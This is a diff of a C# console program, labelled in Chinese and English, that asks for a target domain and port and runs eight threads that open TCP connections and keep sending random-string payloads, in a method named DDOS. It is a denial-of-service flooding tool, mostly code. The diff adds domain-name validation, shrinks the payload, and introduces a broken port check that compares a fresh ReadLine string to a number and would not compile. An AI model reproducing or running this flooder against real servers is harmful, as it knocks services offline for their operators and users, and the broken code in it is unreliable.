@@ -3,6 +3,7 @@ using System.Text;
 using System.Net;
 using System.Net.Sockets;
 using System.Threading;
+using System.Text.RegularExpressions;
 
 class Program
 {
@@ -12,23 +13,36 @@ class Program
     static void Main()
     {
         Console.Clear();
-        Console.Write("服务器    |  Server: ");
-        Program.IP = Console.ReadLine();
+        Console.Write("服务器 |  Server: ");
+        bool isDomainName = false;
+        string DomainPattern = @"^(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$";
+        Regex ymregex = new Regex(DomainPattern);
+        while (!isDomainName)
+        {
+            Program.IP = Console.ReadLine();
+            isDomainName = ymregex.IsMatch(Program.IP);
+            if (!isDomainName)
+            {
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.WriteLine("\n非法地址 | Invalid input");
+                Console.ResetColor();
+            }
+        }
         while (true)
         {
-            Console.Write("端口      |  Port  : ");
-            if (int.TryParse(Console.ReadLine(), out Program.Port))
+            Console.Write("端口   |  Port  : ");
+            if (int.TryParse(Console.ReadLine(), out Program.Port) && Console.ReadLine() < 65536)
             {
                 break;
             }
             else
             {
                 Console.ForegroundColor = ConsoleColor.Red;
-                Console.WriteLine("端口不正确|  Invalid input");
+                Console.WriteLine("\n非法端口 | Invalid input");
                 Console.ResetColor();
             }
         }
-        Console.CursorVisible = false;
+        //Console.CursorVisible = false;
         for (int i = 0; i < 8; i++)
         {
             Thread t = new Thread(DDOS);
@@ -37,25 +51,21 @@ class Program
     }
     static void DDOS()
     {
-        string serverIP = Program.IP;
-        int serverPort = Program.Port;
         reclient:
         Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
         try
         {
-            socket.Connect(serverIP, serverPort);
-            Console.WriteLine("服务器连接成功  |  Connect success.");
+            socket.Connect(Program.IP, Program.Port);
+            Console.WriteLine("连接成功 | Connect success.");
         }
         catch (Exception e)
         {
             Console.ForegroundColor = ConsoleColor.Red;
-            Console.WriteLine("服务器连接失败  |  Unable to connect to server.");
+            Console.WriteLine("连接失败 | Connect faild");
             Console.ResetColor();
         }
-        socket.Send(new byte[] { 0x05, 0x01, 0x00 });
-        int sizeInBytes = 1024 * 1024;
-        string randomString = GenerateRandomString(sizeInBytes);
-        byte[] data = System.Text.Encoding.ASCII.GetBytes(randomString);
+        string randomString = GenerateRandomString(20480);
+        byte[] data = Encoding.UTF8.GetBytes(randomString);
         while (true)
         {
             Program.count++;
@@ -81,12 +91,12 @@ class Program
     static string GenerateRandomString(int sizeInBytes)
     {
         const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()";
-        StringBuilder sb = new StringBuilder(sizeInBytes);
+        StringBuilder rd = new StringBuilder(sizeInBytes);
         Random random = new Random();
         for (int i = 0; i < sizeInBytes; i++)
         {
-            sb.Append(chars[random.Next(chars.Length)]);
+            rd.Append(chars[random.Next(chars.Length)]);
         }
-        return sb.ToString();
+        return rd.ToString();
     }
 }
